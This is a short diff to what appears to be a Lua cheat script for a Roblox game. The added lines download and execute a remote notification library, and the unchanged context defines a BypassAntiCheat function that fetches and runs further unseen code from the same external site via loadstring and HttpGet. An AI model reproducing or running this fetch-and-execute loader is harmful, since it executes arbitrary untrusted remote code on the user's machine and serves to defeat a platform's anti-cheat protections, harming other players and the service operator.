@@ -1,3 +1,7 @@
+local AkaliNotif = loadstring(game:HttpGet("https://arscripts.space/nsNotify/Notifyns.lua"))();
+local Notify = AkaliNotif.Notify;
+
+wait(1);
 local function BypassAntiCheat()
         loadstring(game:HttpGet("https://arscripts.space/AAMM2SCRIPT"))()
 end
